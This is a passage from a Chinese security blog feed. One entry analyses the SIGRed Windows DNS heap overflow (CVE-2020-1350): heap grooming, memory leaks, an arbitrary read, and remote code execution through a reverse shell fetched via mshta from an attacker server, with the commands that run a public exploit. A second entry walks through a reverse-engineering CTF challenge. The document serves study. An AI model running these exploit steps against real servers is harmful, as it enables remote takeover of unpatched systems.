<span class="built_in">print</span>(<span class="string">&#x27;udp_finish&#x27;</span>)</span><br><span class="line">    tcp_server()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tcp_finish&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="三、POC执行"><a href="#三、POC执行" class="headerlink" title="三、POC执行"></a>三、POC执行</h3><p>运行脚本结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310162633329.png" alt="image-20220310162633329"></p><p>靶机上的dns服务被迫关闭了；</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310162741198.png" alt="image-20220310162741198"></p><p>攻击者这边显示收到了tcp和udp连接。</p><h2 id="0x06-流量分析"><a href="#0x06-流量分析" class="headerlink" title="0x06 流量分析"></a>0x06 流量分析</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310163153912.png" alt="image-20220310163153912"></p><p>抓包得到，编号98为我们发送的第一条数据包，这条数据包通过更改tc字段，申请建立tcp连接：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310163431476.png" alt="image-20220310163431476"></p><p>可以看到tcp三次握手的过程（上图中编号120开始）。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310164244803.png" alt="image-20220310164244803"></p><p>在tcp消息中找到我们构造的tcp-sig包，图中圈出的c0 0c指向了前面的域名部分，构造了溢出。</p><p>​    整体的过程就是，由于win server2016本地无法解析“cve1350.com”，因此会以UDP协议向恶意服务器kali发送DNS查询，也就是kali收到的第一个UDP连接。<br>​    恶意服务就向受害者发送响应包，设置TC位，通知受害者采用TCP重发原来的查询请求，并允许返回的响应报文超过512个字节。这是第二个DNS包。<br>​    然后进行三次握手，受害者再次以TCP协议发送请求，这就是kali收到的TCP连接。之后，恶意服务器就可以利用TCP传输大于64KB的响应包发给受害者，触发漏洞，造成堆溢出。</p><h2 id="0x07-exp原理"><a href="#0x07-exp原理" class="headerlink" title="0x07 exp原理"></a>0x07 exp原理</h2><p>​    其实这个漏洞利用最难的部分就是如何在不破坏堆的情况下，做一个类似反弹shell的东西？在本部分中涉及到的知识我也不能完全理解，只能说尽力而为吧。</p><p>参考，引用，翻译自：<br><a href="https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred">https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred</a><br><a href="https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228">https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228</a></p><p><strong>注：本部分图片以及文本均源自上述两个链接，并非原创，仅作翻译总结</strong></p><h3 id="一、背景知识"><a href="#一、背景知识" class="headerlink" title="一、背景知识"></a>一、背景知识</h3><h4 id="WinDNS-堆管理器（堆操作）"><a href="#WinDNS-堆管理器（堆操作）" class="headerlink" title="WinDNS 堆管理器（堆操作）"></a>WinDNS 堆管理器（堆操作）</h4><p>​    WinDNS 服务通过管理自己的内存池，以达到管理堆内存的目的。如果请求的缓冲区大小超过 0xA0 字节，它将从 Windows 本机堆管理器 ( <strong>HeapAlloc</strong> ) 请求内存；否则，它将使用memory pool bucket，每个bucket中的缓冲区都被储存在一个单链表中。如果所选memory pool bucket中没有更多可用缓冲区，则会从本机堆中请求一个内存块，划分为单独的缓冲区，然后添加到相应存储桶的列表中。</p><p>​    简单的说，就是WinDNS 管理自己的内存池。有 4 个内存池桶 用于不同的分配大小（0x50、0x68、0x88、0xa0）。如果所需的分配大小大于 0xa0，WinDNS 将使用本机 Windows 堆。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316084140261.png" alt="image-20220316084140261"></p><p>​    <em>上图为dns!Mem_Alloc 的反编译</em></p><p>‍</p><p>​    当其中一个内存桶中的缓冲区被释放时，它们不会返回到 Windows 本机堆。相反，它们会被添加回该存储桶的可用缓冲区列表中。缓冲区是按后进先出 (LIFO) 分配的，这意味着要释放的最后一个缓冲区将是下一个要分配的缓冲区。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316085438468.png" alt="image-20220316085438468"></p><p>​    <em>dns反编译！Mem_Free</em></p><h4 id="WinDNS-缓冲区结构"><a href="#WinDNS-缓冲区结构" class="headerlink" title="WinDNS 缓冲区结构"></a>WinDNS 缓冲区结构</h4><p>WinDNS 缓冲区的结构如下：</p><p>​    这个结构就是相当于缓冲区里没有东西时，应该放什么。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c6222017782f24e4d1_aa91b3_6a9906be77d3468aa059e7ce333c7027~mv2.png" alt="img"></p><p>在开发exp的过程中，我们需要用到这个结构。</p><h4 id="RR-record结构"><a href="#RR-record结构" class="headerlink" title="RR_record结构"></a>RR_record结构</h4><p>这个结构就是我们储存一条dns记录在堆中的结构。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c8c2e0bb08a5b1629f_aa91b3_2e95baa7527f41e3b4fc7dec0c87a822~mv2.png" alt="img"></p><h3 id="二、开辟地址，避免分段错误（打洞）"><a href="#二、开辟地址，避免分段错误（打洞）" class="headerlink" title="二、开辟地址，避免分段错误（打洞）"></a>二、开辟地址，避免分段错误（打洞）</h3><p>​    如果我们可以在一个连续堆段的中间触发释放缓冲区，然后重新分配它给另一条数据，这条数据我们构造溢出缓冲区，我们就可以获得一大片地址，但是于此同时，我们需要避免出现segfault。</p><p>​    那么，什么时候会发生segfault呢？顾名思义，就是当系统检测到地址放的东西与应该放的东西不一样的时候就会报错，那么系统监测发生在什么时候呢？就是在进行HeapAlloc 和 HeapFree 的时候，我们只要HeapFree的调用，就不会出现segfault</p><p>​    要做到上述的思路，我们可以通过向受害者客户端进行查询，通过控制恶意DNS服务器返回内容的 TTL（生存时间）来达成该思路，也就是说，生存时间足够长的记录只要一直不释放，系统就不会检测，不检测就不会出现segfault。<strong>注：过期记录每约 2 分钟释放一次。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c64336d0dccfe87280_aa91b3_bbbaa7f0334643eb838f44792c9f897f~mv2.png" alt="img"></p><p><em>恶意 DNS 服务器控制 TTL，使其增长</em></p><p>总结一下我们开辟一片连续稳定，用于溢出的堆地址的基本步骤：</p><ul><li>向受害者服务器多次查询恶意域的子域。</li><li>恶意 DNS 服务器会给受害者很多响应，受害者将其缓存在堆内存中（这些响应都没有溢出）。</li><li>恶意 DNS 服务器将为除一个之外的所有子域分配一个长 TTL（生存时间），只有一个子域有短TTL，所以他两分钟之后就会被释放。</li><li>两分钟后，我们短TTL的缓冲区被释放，并发生了检测，没有异常。</li><li>然后使用<strong>SIG</strong>消息查询，这一次恶意DNS服务器会返回溢出的数据。</li><li>因为缓冲区是 LIFO 分配的，所以新的记录缓冲区将与内存中刚刚过期，被释放的那条记录具有相同的地址。</li></ul><p>这也就是所谓的打一个洞。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c7d5712e436455c3d3_aa91b3_3524254ae14c4838b8d6e689e3927922~mv2.png" alt="img"></p><p><em>在堆中打一个洞以避免 SEGFAULT</em></p><p>​    当然，我们还可以做的更好，因为短 TTL 这一思路还必须要等待两分钟，在这两分钟里，其他的事件、或者其他人的请求有可能会打乱我们的攻击流程，让我们失去对于堆中所存数据的控制（就是容易时间一长就出问题）。所以我们需要一个方法达到瞬间释放缓冲区！</p><p>​    也就是，更改RR_record中的<strong>dwTTL</strong>和**dwTimeStamp **字段。为什么更改这个字段有效果呢？受害服务器记录了这条信息后，我们可以再次向他发出对于这条信息的请求，这样一来他就会再堆区中查询这条数据，但是他查到之后不会立刻返回给我们，而是会检查这条信息有没有过期，如果过期了，就会被释放。</p><p>​    简单地说，我们将<strong>dwTTL</strong>和**dwTimeStamp **字段置为0，然后再向受害者发送同样的查询信息，他就会主动将改记录的内存释放，也就达成了我们需要的可控释放（立即释放）。</p><p>‍</p><h3 id="三、泄漏内存地址"><a href="#三、泄漏内存地址" class="headerlink" title="三、泄漏内存地址"></a>三、泄漏内存地址</h3><h4 id="泄漏堆地址（相对地址）"><a href="#泄漏堆地址（相对地址）" class="headerlink" title="泄漏堆地址（相对地址）"></a>泄漏堆地址（相对地址）</h4><p>我们现在可以通过执行以下操作来泄漏堆中的地址：</p><ul><li>按照上文中提到的立刻释放的方法，释放假的<strong>RR_Record</strong>，这样一来，释放后的内存就会如同上文中提到的<strong>WinDNS 缓冲区结构</strong>一样，含有一条pNextFreeBuff的记录。</li><li>（这一步实际在上一步之前进行）给被释放record上面的那个假<strong>RR_Record</strong>一个大的<strong>wRecordSize</strong>，超过其实际大小。</li><li>向受害者发送子域的<strong>SIG</strong>查询，查询伪造的大<strong>wRecordSize</strong>的那条记录。</li><li>响应将超过缓冲区的实际大小，并在其下方包含已释放记录的<strong>WINDNS_FREE_BUFF</strong>结构数据。<strong>这会在pNextFreeBuff</strong>字段中泄漏一个有效的堆地址。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f7161c501cae7cf71c_aa91b3_67311c33ac5a4faea4a0a7839f284245~mv2.png" alt="img"></p><p><em>使用伪造的 RR_Record 对象泄漏堆指针</em></p><p>​    这样一来，如上图所示，蓝线上面的pNextFreeBuff就会返回到恶意服务器，我们获得了第一个内存泄漏！但是，我们实际上并不知道泄露的指针相对于我们控制的堆区域的位置，如果我们能得到溢出缓冲区的地址就更好了。因此，我们可以简单地释放两个假的<strong>RR_Record</strong>对象，并泄漏我们最后释放的缓冲区的地址。<strong>释放缓冲区时，指向在写入pNextFreeBuff</strong>字段之前已释放的缓冲区的指针。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f7dbe92852b3598189_aa91b3_3d7a3b96f79c4588b9c015366dc55366~mv2.png" alt="img"></p><p><em>泄漏指向堆的可控部分的指针</em></p><p>‍ 我们<br>现在知道了我们控制的部分堆的确切地址！这将在以后有用。</p><h4 id="泄露-dns-exe-地址（绝对地址）"><a href="#泄露-dns-exe-地址（绝对地址）" class="headerlink" title="泄露 dns.exe 地址（绝对地址）"></a>泄露 dns.exe 地址（绝对地址）</h4><p>​    接下来，我们需要在需要处理ASLR （地址空间布局随机化）。要泄漏<strong>dns.exe</strong>内部的地址，我们需要触发分配一种特殊类型的对象，我将其称为<strong>DNS_Timeout</strong>对象。</p><p>DNS_TimeOut对象具有以下结构：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f7558c6fdcb6eca7aa_aa91b3_27b27d797c8a42fb8bdc4d2a2537b3af~mv2.png" alt="img"></p><p>​    当 DNS 记录过期时，调用<strong>dns!RR_Free</strong>。如果 DNS 记录类型为<strong>DNS_TYPE_NS</strong>、<strong>DNS_TYPE_SOA</strong>、<strong>DNS_TYPE_WINS</strong>或<strong>DNS_TYPE_WINSR</strong> [<a href="https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants">6]</a>，它们不会立即释放。而是调用<strong>dns!Timeout_FreeWithFunctionEx</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f717b25649351fc088_aa91b3_b9b5250b36a9499ba2d4376f60e28ca0~mv2.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316200416598.png" alt="image-20220316200416598"></p><p>（我好迷惑为什么我逆向的结果完全和他们不一样呢？）</p><p><em>dns的近似反编译！RR_Free</em></p><p>‍     在<strong>Timeout_FreeWithFunctionEx</strong>中，为<strong>DNS_Timeout</strong>对象分配了一个 WinDNS 缓冲区，然后，<strong>RR_Free</strong>的地址和一个字符串分别写入该对象的<strong>pFreeFunction</strong>和<strong>pszFile</strong>字段。这些将是我们的<strong>dns.exe</strong>地址泄漏。如果我们在我们控制的堆区域中触发超时对象的分配，我们可以使用与之前相同的方法来泄漏地址。</p><p>​    重点是将RR_Free函数的地址卸载了堆内存中，这是这个问题的关键。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f78cd2bc0e395094d4_aa91b3_a3e6de45bb44402ba503f7b68a6cbc03~mv2.png" alt="img"></p><p><em>dns!Timeout_FreeWithFunctionEx 的反编译</em></p><p>我们通过首先释放一个假缓冲区大小为 0x50的假<strong>RR_Record</strong>对象来触发对象分配，这是为 <strong>DNS_Timeout</strong> 对象分配的存储桶内存大小。然后，我们向受害者进行一些NS查询以获取恶意域。一旦记录过期，将为每个查询分配一个超时对象。如果在等待NS记录过期时释放了大小为 0x50 的新缓冲区，则有必要进行其中几个查询。我们可以再次通过请求其上方的缓存记录来泄漏内存，使用伪造的大<strong>wRecordSize</strong>。（总之呢，就是使用和上面一样的方法，但是不同的函数进行触发）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f83c2a55b0a9f834c4_aa91b3_0faf3a4354db4d17a30d01f93830e3d6~mv2.png" alt="img"></p><p><em>通过分配 DNS_Timeout 对象泄漏 dns.exe 地址</em></p><p>现在我们已经泄露了<strong>dns.exe</strong>中的地址，我们可以使用它们来计算二进制文件中函数的地址。通过获取泄漏地址的最后 12 位，我们可以为各种版本的<strong>dns.exe</strong>创建一个到偏移量的映射。</p><p>最初，我认为我可以通过简单地使用<strong>wRecordType = DNS_TYPE_NS</strong>释放一个假的<strong>RR_Record</strong>对象来触发超时对象的分配<strong>。</strong>因此，避免了等待 2 分钟让 NS 记录过期。但是，当我尝试执行此操作时，一些检查会阻止使用修改后的<strong>wRecordType在fakeRR_Recor</strong>d上调用<strong>RR_Free</strong>。我在调查这个问题时没有时间，所以这是一个潜在的改进领域。</p><h3 id="四、任意读取"><a href="#四、任意读取" class="headerlink" title="四、任意读取"></a>四、任意读取</h3><p>​    请注意，通过上文中提到覆盖<strong>RR_free</strong>的方法，我们已经能够通过覆盖已分配的<strong>DNS_timeout</strong>对象中的<strong>pFreeFunction</strong>指针来执行代码。</p><p>​    更进一步的，在函数<strong>dns!Timeout_CleanupDelayedFreelist</strong>中，为<strong>CoolingDelayedFreeList</strong>中的每个超时对象（ <strong>DNS_Timeout</strong> 对象）调用<strong>pFreeFunction</strong>中的函数地址，简言之，就是通过列表的方式调用函数。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f83c2a55e988f834c3_aa91b3_5268b6c5246d486b8796c1026e1c28f8~mv2.png" alt="img"></p><p><em>dns!Timeout_CleanupDelayedFreeList 的近似反编译</em></p><p>​    我们可以在分配超时对象覆盖这些字段后再次触发漏洞。</p><p>​    现代版本的<strong>dns.exe</strong>使用 Control Flow Guard (CFG) [<a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">4]</a>进行编译。绕过 CFG 的一种已知方法是破坏堆栈[<a href="https://improsec.com/tech-blog/bypassing-control-flow-guard-in-windows-10">11]</a>上的返回地址并使用 ROP [<a href="https://en.wikipedia.org/wiki/Return-oriented_programming">7]</a>方法执行。<em>注：CFG是一种在在运行时加载地址的防漏洞方式。</em>但是，我们目前还没有稳定的方式来写入堆栈。相反，我们可以找到用于原语的有效调用目标（即<strong>dns.exe中的函数）。</strong></p><p>​    一个合适的候选者是<strong>dns!NsecDnsRecordConvert</strong>，它采用一个参数[<a href="https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228">3]</a>。</p><p><strong>NsecDnsRecordConvert</strong>的参数应具有以下结构：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f83c2a55ae18f834c5_aa91b3_9d45541820f94f49a93ee8e423e4165e~mv2.png" alt="img"></p><p>​    在这个函数内部，分配了一个缓冲区并调用了<strong>Dns_StringCopy</strong>，如果我们控制传入的函数参数及其内容，我们就可以将<strong>pDnsString</strong>字段设为我们要读取的地址。在<strong>DNS_StringCopy</strong>内部，分配了一个缓冲区，并复制了<strong>pDnsString</strong>指向的数据（直到一个空字节），也就是通过这个函数实现任意读取。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f8db0ccecdb0e7edbb_aa91b3_31668603d0c740689bd13149ef90472a~mv2.png" alt="img"></p><p><em>dns的反编译！NsecDnsRecordConvert</em></p><p>​    因为我们还控制<strong>wSize</strong>，所以我们控制分配的缓冲区的大小。因此，我们强制将新缓冲区分配到我们控制的堆区域中。数据复制完成后，我们使用与之前相同的方法泄漏内存。</p><p><img src="https://uploads-ssl.webflow.com/61a8a9fbeff4dc7f21784049/61bb52f87784b7988275f8a1_aa91b3_7152eedcbcb64374bc3bbaf325d91518~mv2.png" alt="img"></p><p><em>任意读取原语</em></p><p>​    ‍ 我们读取的<strong>msvcrt.dll</strong>的地址。我选择了<strong>dns!_imp_exit</strong>，其中包含<strong>msvcrt!exit</strong>的地址。这将破坏<strong>msvcrt.dll</strong>的 ASLR 。有了这个，我们可以计算出<strong>msvcrt!system</strong>的地址。</p><h3 id="五、代码执行与shell连接"><a href="#五、代码执行与shell连接" class="headerlink" title="五、代码执行与shell连接"></a>五、代码执行与shell连接</h3><p>​    现在所有部分都已准备就绪，可以远程执行代码了。我们可以再次触发<strong>DNS_Timeout</strong>对象的分配。然后，我们用<strong>msvcrt!system</strong>和<strong>pFreeFuncParam</strong>覆盖<strong>pFreeFunction</strong> ，并使用包含有效负载命令的内存堆地址。为了获得反向 shell，我选择使用<strong>mshta.exe</strong>从攻击者托管的 HTTP 服务器执行 HTA shell。我发现这是最简单的解决方案，但还有许多其他可能性。该漏洞也可以被重新设计以使用任何其他函数而不是<strong>system</strong>。</p><p><strong>Mshta.exe：</strong></p><blockquote><p>​    Mshta.exe运行MicrosoftHTML应用程序主机，这是WindowsOS实用程序，负责运行HTA(HTML应用程序)文件。我们可以用来运行JavaScript或VBScript的HTML文件。您可以使用MicrosoftMSHTA.exe工具解释这些文件。</p><p>现在，通过受害者计算机上的mshta.exe(容易受到RCE攻击)运行恶意代码，以获取Meterpreter会话。</p><p>总之呢，就是在达成rce之后，就可以通过Mshta.exe来构造一个反弹shell，应该是这个意思吧。</p></blockquote><h2 id="0x08-exp的利用"><a href="#0x08-exp的利用" class="headerlink" title="0x08 exp的利用"></a>0x08 exp的利用</h2><p><strong>实验环境：</strong>ubuntu20.04+Win server2019</p><p>利用步骤：</p><p>​    首先要把ubuntu的53端口系统进程杀死，然后执行指令：</p><ol><li><code>sudo python3 configure.py -ip 192.168.6.131 -p 8081 -hp 80</code></li><li><code>sudo python3 evildns.py</code></li><li><code>python3 exploit.py -ip 192.168.6.129 -d cve1350.com</code></li><li><code>python3 reverse_shell/server.py -p 8081</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220315174042283.png" alt="image-20220315174042283"></p><p>效果：（远程控制）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316153134148.png" alt="image-20220316153134148"></p><h2 id="0x09-参考文献"><a href="#0x09-参考文献" class="headerlink" title="0x09 参考文献"></a>0x09 参考文献</h2><p>提供poc脚本：<br><a href="https://github.com/maxpl0it/CVE-2020-1350-DoS">https://github.com/maxpl0it/CVE-2020-1350-DoS</a></p><p>优秀指导教程：<br><a href="https://www.cnblogs.com/PsgQ/p/14806195.html#/c/subject/p/14806195.html">https://www.cnblogs.com/PsgQ/p/14806195.html#/c/subject/p/14806195.html</a><br><a href="https://mp.weixin.qq.com/s/gdPUGnFLKzS5FqcH8T9byw">https://mp.weixin.qq.com/s/gdPUGnFLKzS5FqcH8T9byw</a><br><a href="https://bbs.pediy.com/thread-260712.htm">https://bbs.pediy.com/thread-260712.htm</a></p><p>checkpoint：<br><a href="https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/">https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/</a></p><p>exp思路、源代码、运用：</p><p><a href="https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred">https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred</a></p><p><a href="https://github.com/chompie1337/SIGRed_RCE_PoC">https://github.com/chompie1337/SIGRed_RCE_PoC</a></p><p>exp构造原理：</p><p><a href="https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228">https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228</a></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>reverse_花指令实例</title>
      <link href="/2022/03/05/reverse_%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AE%9E%E4%BE%8B/"/>
      <url>/2022/03/05/reverse_%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="reverse-花指令实例"><a href="#reverse-花指令实例" class="headerlink" title="reverse_花指令实例"></a>reverse_花指令实例</h1><p>以<code>看雪.TSRC 2017CTF秋季赛</code>第二题为例，解决花指令的反调试问题。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305101852053.png" alt="image-20220305101852053"></p><p>一上来就F5失败。</p><p>一开始先打印了一行字，然后调用了一个干扰函数，进入逻辑相对清晰的<code>sub_401050</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305102332825.png" alt="image-20220305102332825"></p><p><code>scanf()</code>没限制长度，可以把返回地址盖掉。。。</p><p>所以说，基础的逻辑都是假的，这题就是要输入一个比较长的内容覆盖返回地址后才会出现真东西。</p><p>那么，我们要跳到哪里才能正常执行呢？</p><p>idaview往下找：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305103253955.png" alt="image-20220305103253955"></p><p>c键变code：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305103327310.png" alt="image-20220305103327310"></p><p>看起来比较靠谱，也就是说应该跳转到地址<code>0x00413131</code>处。</p><p>我们可以直接pwn-tools构造一个脚本，但似乎听说看雪比赛似乎是只能输入字母和数字的，仔细看地址正好是<code>A11</code>的值，因此就不需要折磨自己了。</p><p>直接构造溢出字符串为<code>222222222222A11</code>(十二个填充位，三个溢出地址位)。</p><p>扔进去执行，并没有什么变化。。。动调看看吧。。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305103952383.png" alt="image-20220305103952383"></p><p>进来先整一个断点，然后直接F9</p><p>发现我傻了，地址构造反了，正确的应该是<code>22222222222211A</code>（小端序）</p><p>同样动调，然后<code>remove analysis from this module</code>，把这里变回代码。</p><p>然后动调发现绕来绕去，快疯了，这里记录一个：</p><p><strong>调试跟踪跳转多的技巧</strong></p><p><code>view-Run trace</code>打开跟踪窗口，<code>ctrl-F11</code>为记录步入后的逻辑，<code>ctrl-F12</code>为记录步过的逻辑，就相当于记录了手动<code>F7/f8</code>运行的每一步逻辑，都可以在窗口中查看，这一样就会在跳转非常多的情况下清晰的多。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305114920532.png" alt="image-20220305114920532"></p><p>这样就清晰的多了，然后我就不会了。。。</p><p>以下参考：<a href="https://bbs.pediy.com/thread-222284.htm%EF%BC%88%E7%9C%9F%E6%98%AF%E6%81%90%E6%80%96%EF%BC%89">https://bbs.pediy.com/thread-222284.htm（真是恐怖）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">//还原的加花乱序</span><br><span class="line">////////////////////////////////////////</span><br><span class="line"> add esp,-0x10</span><br><span class="line"> xor eax,eax</span><br><span class="line"> mov dword ptr ds:[0x41B034],eax</span><br><span class="line"> </span><br><span class="line"> pop eax        //eax=x</span><br><span class="line"> mov ecx,eax    //ecx=x</span><br><span class="line"> </span><br><span class="line"> pop eax        //eax=y</span><br><span class="line"> mov ebx,eax    //ebx=y</span><br><span class="line"> </span><br><span class="line"> pop eax        //eax=z</span><br><span class="line"> mov edx,eax    //edx=z</span><br><span class="line"> </span><br><span class="line"> mov edx,eax   </span><br><span class="line"> mov eax,ecx    //eax=x</span><br><span class="line"> sub eax,ebx    //eax=x-y</span><br><span class="line"> shl eax,0x2    //eax shl 2</span><br><span class="line"> add eax,ecx    //eax+=x</span><br><span class="line"> add eax,edx    //eax+=z</span><br><span class="line"> sub eax,0xEAF917E2 //(必须为零)</span><br><span class="line"> </span><br><span class="line"> add eax, ecx    //eax=x</span><br><span class="line"> sub eax, ebx    //eax-=y</span><br><span class="line"> mov ebx, eax    //ebx=(x-y)</span><br><span class="line"> shl eax, 1        //eax shl 1</span><br><span class="line"> add eax, ebx    //eax+=(x-y)</span><br><span class="line"> add eax, ecx    //eax+=x</span><br><span class="line"> mov ecx, eax    //ecx=eax</span><br><span class="line"> add eax, edx    //eax+=edx</span><br><span class="line"> sub eax, 0xe8f508c8 //(必须为零)</span><br><span class="line"> </span><br><span class="line"> mov eax, ecx    //eax=original</span><br><span class="line"> mov eax, ecx</span><br><span class="line"> sub eax, edx    //eax-=edx</span><br><span class="line"> sub eax, 0xc0a3c68 //(必须为零)</span><br><span class="line"> </span><br><span class="line"> pop eax</span><br><span class="line"> xor eax, 0x8101</span><br><span class="line"> mov edi, eax</span><br><span class="line"> xor eax, eax</span><br><span class="line"> stosd dword ptr es:[edi], eax</span><br><span class="line"> call 0x413841  //00413830 PUSH 00413835</span><br><span class="line"> pop eax</span><br><span class="line"> push eax</span><br><span class="line"> mov edi, eax</span><br><span class="line"> mov edi, eax</span><br><span class="line"> push 0x4e000969</span><br><span class="line"> pop eax</span><br><span class="line"> xor eax, edx</span><br><span class="line"> stosd dword ptr es:[edi], eax</span><br><span class="line"> xor eax, 0x10a3e</span><br><span class="line"> stosd dword ptr es:[edi], eax</span><br><span class="line"> xor eax, ebx</span><br><span class="line"> xor eax, 0x22511e14</span><br><span class="line"> stosd dword ptr es:[edi], eax</span><br><span class="line"> xor eax, 0x61642d</span><br><span class="line"> xor eax, dword ptr [0x41b034]</span><br><span class="line"> jmp eax</span><br><span class="line"> ////////////////////////////////////////////</span><br></pre></td></tr></table></figure><p>大哥硬是把逻辑整理出来了。。。恐怖如斯，我不能理解</p><p>然后就是根据三个为零条件求解三元方程。。。，这里依然搬运一下：</p><blockquote><p>((x-y) shl 2)+x+z==0xEAF917E2     即3942193122‬<br>(x-y) shl 1 + (x-y) +x+z==0xe8f508c8     即3908372680<br>(x-y) shl 1 + (x-y) +x-z==0xc0a3c68     即201997416</p></blockquote><p>反正总之最后解出来了，然后转化为字符串就是答案。。。</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反调试技术_各种标志</title>
      <link href="/2022/03/04/Reverse%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF_%E5%90%84%E7%A7%8D%E6%A0%87%E5%BF%97(flag)/"/>
      <url>/2022/03/04/Reverse%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF_%E5%90%84%E7%A7%8D%E6%A0%87%E5%BF%97(flag)/</url>
      
